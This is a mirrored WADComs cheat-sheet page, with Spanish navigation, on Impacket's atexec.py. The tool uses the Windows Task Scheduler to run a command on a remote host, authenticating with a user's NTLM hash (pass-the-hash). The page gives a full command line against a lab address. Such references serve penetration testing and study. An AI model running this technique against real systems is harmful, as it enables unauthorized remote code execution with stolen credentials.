# WADComs: Impacket-atexec-Hash

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Hash`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

	Command Executed: whoami

## Comando

```bash
python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py
- https://u0041.co/blog/post/1
